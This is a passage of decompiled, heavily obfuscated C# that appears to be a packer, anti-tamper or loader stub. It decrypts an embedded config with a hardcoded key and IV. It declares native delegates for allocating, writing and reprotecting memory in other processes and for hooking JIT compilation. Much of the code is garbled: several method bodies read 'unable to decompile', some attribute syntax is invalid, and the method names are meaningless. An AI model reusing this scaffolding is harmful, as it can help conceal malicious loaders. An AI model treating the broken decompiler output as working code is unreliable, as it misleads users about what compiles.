        (byte) 156,
        (byte) 221,
        (byte) 154,
        (byte) 121,
        (byte) 221,
        (byte) 183,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 9,
        (byte) 43,
        (byte) 67,
        (byte) 81,
        (byte) 23,
        (byte) 43,
        (byte) 74,
        (byte) 63,
        (byte) 64,
        (byte) 23,
        (byte) 95,
        (byte) 185,
        (byte) 226,
        (byte) 244,
        (byte) 45,
        (byte) 194,
        (byte) 211,
        (byte) 43
      };
      symmetricAlgorithm.IV = new byte[16]
      {
        (byte) 117,
        (byte) 254,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 52,
        (byte) 9,
        (byte) 43,
        (byte) 221,
        (byte) 154,
        (byte) 12,
        (byte) 54,
        (byte) 68,
        (byte) 241,
        (byte) 68,
        (byte) 66
      };
      CryptoStream cryptoStream = new CryptoStream(stream, symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(config, 0, config.Length);
      cryptoStream.Close();
      return ProxyMockTemplate.RegisterParameter(stream);
    }

    private byte[] MapParameter() => "{11111-22222-10001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private byte[] ConnectParameter() => "{11111-22222-10001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private byte[] ManageParameter() => "{11111-22222-20001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private byte[] MoveParameter() => "{11111-22222-20001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private byte[] DefineParameter() => "{11111-22222-30001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private byte[] CalcParameter() => "{11111-22222-30001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    internal byte[] CancelParameter() => "{11111-22222-40001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    internal byte[] ExcludeParameter() => "{11111-22222-40001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    internal byte[] OrderParameter() => "{11111-22222-50001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    internal byte[] IncludeParameter() => "{11111-22222-50001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    private delegate void ParameterSingletonPolicy(object o);

    internal class Attribute : System.Attribute
    {
      [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
      public Attribute(object config)
      {
        // ISSUE: unable to decompile the method.
      }

      internal class ExporterIdentifierMapping<T>
      {
        public ExporterIdentifierMapping()
        {
          // ISSUE: unable to decompile the method.
        }
      }
    }

    internal class Expression
    {
      [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
      internal static string AddParameter(string task, string selection)
      {
        // ISSUE: unable to decompile the method.
      }

      public Expression()
      {
        // ISSUE: unable to decompile the method.
      }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate uint ServerParameterQueue(
      IntPtr classthis,
      IntPtr comp,
      IntPtr info,
      [MarshalAs(UnmanagedType.U4)] uint flags,
      IntPtr nativeEntry,
      ref uint nativeSizeOfCode);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr WatcherDicWriter();

    internal struct Candidate
    {
      internal bool m_Registry;
      internal byte[] _Info;
    }

    internal class GetterThreadDeSerializer
    {
      private BinaryReader role;

      public GetterThreadDeSerializer(Stream i)
      {
        // ISSUE: unable to decompile the method.
      }

      [SpecialName]
      internal Stream fHSkdAnkJf()
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte[] FindParameter(int index_init)
      {
        // ISSUE: unable to decompile the method.
      }

      internal int PatchParameter(byte[] first, int num_b, int servamount)
      {
        // ISSUE: unable to decompile the method.
      }

      internal int CollectParameter()
      {
        // ISSUE: unable to decompile the method.
      }

      internal void RunParameter()
      {
        // ISSUE: unable to decompile the method.
      }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
    private delegate IntPtr ReaderMockTemplate(IntPtr hModule, string lpName, uint lpType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr DecoratorDicWriter(
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int RequestConfigurationConnector(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      [In, Out] byte[] buffer,
      uint size,
      out IntPtr lpNumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int Schema(
      IntPtr lpAddress,
      int dwSize,
      int flNewProtect,
      ref int lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr ConsumerThreadBridge(
      uint dwDesiredAccess,
      int bInheritHandle,
      uint dwProcessId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int CollectionWorkerStruct(IntPtr ptr);

    [Flags]
    private enum AssignmentGradeFormat
    {
    }
  }
}
